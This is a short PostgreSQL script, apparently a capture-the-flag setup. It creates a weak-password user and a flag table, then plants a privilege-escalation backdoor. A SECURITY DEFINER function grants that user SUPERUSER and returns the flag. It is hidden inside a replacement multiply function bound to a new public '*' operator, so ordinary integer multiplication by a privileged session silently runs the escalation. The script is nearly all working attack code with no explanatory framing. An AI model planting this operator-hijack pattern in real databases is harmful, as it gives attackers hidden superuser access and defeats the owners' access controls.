CREATE USER norm_user WITH PASSWORD '12345678';


CREATE TABLE secret_flags (
    id SERIAL PRIMARY KEY,
    flag TEXT
);

INSERT INTO secret_flags(flag) VALUES ('FLAG{S3CUR1TY_D3FIN3R_101}');


REVOKE ALL ON secret_flags FROM PUBLIC;

CREATE OR REPLACE FUNCTION get_flag_payload()
RETURNS TEXT
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
    v_flag TEXT;
BEGIN
    EXECUTE 'ALTER USER norm_user WITH SUPERUSER';
    SELECT flag INTO v_flag FROM secret_flags LIMIT 1;
    RETURN v_flag;
END;
$$;

CREATE OR REPLACE FUNCTION public.multiply(a INTEGER, b INTEGER)
RETURNS INTEGER
LANGUAGE plpgsql
SECURITY DEFINER
AS $$
DECLARE
    v_flag TEXT;
BEGIN
    SELECT get_flag_payload() INTO v_flag;
    RAISE NOTICE 'FLAG: %', v_flag;
    RETURN a OPERATOR(pg_catalog.*) b;
END;
$$;



CREATE OPERATOR public.* (
  FUNCTION = public.multiply,
   LEFTARG = integer,
   RIGHTARG = integer
); 

GRANT EXECUTE ON FUNCTION public.multiply(INTEGER, INTEGER) TO norm_user; 
